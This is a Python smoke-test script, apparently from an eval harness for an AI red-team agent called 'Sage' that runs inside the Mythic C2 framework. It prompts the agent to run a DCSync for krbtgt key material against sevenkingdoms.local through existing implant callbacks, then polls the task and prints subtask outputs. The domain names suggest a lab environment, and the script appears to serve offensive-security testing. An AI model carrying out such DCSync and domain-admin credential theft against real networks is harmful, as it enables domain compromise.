#!/usr/bin/env python3
"""Bounded live smoke for the current parent-domain DCSync frontier."""

import asyncio
import base64
import json
import os
import sys
import time

sys.path.insert(0, "/home/john/dev/sage/Payload_Type/sage")
from evals.harness import resolve_password, login_to_mythic  # noqa: E402
from mythic import mythic  # noqa: E402


SAGE_CB = int(os.environ.get("SAGE_CB", "12"))
MERLIN_CB = int(os.environ.get("MERLIN_CB", "8"))
APOLLO_CB = int(os.environ.get("APOLLO_CB", "11"))
CAP_SECONDS = int(os.environ.get("CAP_SECONDS", "300"))
MAX_STEPS = int(os.environ.get("MAX_STEPS", "90"))

PROMPT = f"""
Continue from Sage's durable engagement state, but execute only the current grounded frontier action.

Live callbacks: Sage callback {SAGE_CB}, Merlin callback {MERLIN_CB} on CASTELBLACK as NORTH\\samwell.tarly,
and Apollo callback {APOLLO_CB} on CASTELBLACK as samwell.tarly. Re-check state/callbacks if needed.

Current state already records `da:sevenkingdoms.local` from a proved Kerberos service-access check. Do not
forge another ticket, do not run `make_token`, and do not create another logon session unless the existing
context is explicitly proven absent and you stop to report that blocker. First validate the current execution
context with inventory/proof commands only; if the proof succeeds, reuse that context.

Objective for this run: complete or truthfully fail the generic capability `dcsync-krbtgt` for
`sevenkingdoms.local`, then stop. Use `build_capability_commands` for `dcsync-krbtgt` with
`domain=sevenkingdoms.local` and issue the exact returned DCSync command once from the validated current
context. If the output contains real krbtgt key material, record the capability result and show updated state.
If it returns access denied, bad DN, or no secret material, record a failed result with the concrete Mythic
task id and stop. Do not proceed to ESSOS in this run.
""".strip()


def _decode_output(rows):
    chunks = []
    for row in rows or []:
        raw = row.get("response_text") or ""
        if raw:
            try:
                chunks.append(base64.b64decode(raw).decode("utf-8", "replace"))
                continue
            except Exception:
                pass
        chunks.append(str(row.get("response") or raw or ""))
    return "\n".join(part for part in chunks if part)


async def _task_status(client, task_id: int) -> dict:
    query = "query S($id:Int!){ task(where:{display_id:{_eq:$id}}){ display_id status completed } }"
    rows = (
        await mythic.execute_custom_query(mythic=client, query=query, variables={"id": task_id})
    ).get("task", [])
    return rows[0] if rows else {}


async def main() -> int:
    client = await login_to_mythic(resolve_password())
    task = await mythic.issue_task(
        mythic=client,
        command_name="query",
        parameters=json.dumps({
            "prompt": PROMPT,
            "verbose": True,
            "autonomous_solve": True,
            "max_steps": MAX_STEPS,
        }),
        callback_display_id=SAGE_CB,
        wait_for_complete=False,
    )
    task_id = int(task.get("display_id") or task.get("id"))
    print(f"TASK_ID={task_id}", flush=True)

    start = time.time()
    stopped = False
    while True:
        elapsed = int(time.time() - start)
        status = await _task_status(client, task_id)
        print(
            f"[{elapsed}s] status={status.get('status')!r} completed={status.get('completed')}",
            flush=True,
        )
        if status.get("completed") or str(status.get("status") or "").lower() in {
            "error",
            "success",
            "completed",
            "stopped",
        }:
            break
        if elapsed >= CAP_SECONDS:
            print(f"[{elapsed}s] cap hit; issuing stop for task {task_id}", flush=True)
            await mythic.issue_task(
                mythic=client,
                command_name="stop",
                parameters=str(task_id),
                callback_display_id=SAGE_CB,
                wait_for_complete=False,
            )
            stopped = True
            await asyncio.sleep(20)
            status = await _task_status(client, task_id)
            print(
                f"[{int(time.time() - start)}s] after-stop status={status.get('status')!r} "
                f"completed={status.get('completed')}",
                flush=True,
            )
            break
        await asyncio.sleep(20)

    query = """
    query T($id:Int!) {
      subtasks: task(where:{display_id:{_gt:$id}}, order_by:{display_id:asc}) {
        display_id command_name status completed callback { display_id host payload { payloadtype { name } } }
      }
    }
    """
    subtasks = (
        await mythic.execute_custom_query(mythic=client, query=query, variables={"id": task_id})
    ).get("subtasks", [])
    print(f"NEW_SUBTASKS={len(subtasks)}", flush=True)
    for subtask in subtasks[-30:]:
        callback = subtask.get("callback") or {}
        payload_type = (((callback.get("payload") or {}).get("payloadtype") or {}).get("name"))
        print(
            f"#{subtask.get('display_id')} cb{callback.get('display_id')} {payload_type} "
            f"{subtask.get('command_name')} {subtask.get('status')} completed={subtask.get('completed')}",
            flush=True,
        )

    output = _decode_output(
        await mythic.get_all_task_output_by_id(mythic=client, task_display_id=task_id)
    )
    print("=== SOLVE OUTPUT TAIL ===")
    print(output[-12000:])

    for subtask in subtasks[-10:]:
        subtask_id = subtask.get("display_id")
        subtask_output = _decode_output(
            await mythic.get_all_task_output_by_id(mythic=client, task_display_id=subtask_id)
        )
        if subtask_output:
            print(f"=== OUTPUT #{subtask_id} {subtask.get('command_name')} TAIL ===")
            print(subtask_output[-2500:])

    return 2 if stopped else 0


if __name__ == "__main__":
    raise SystemExit(asyncio.run(main()))
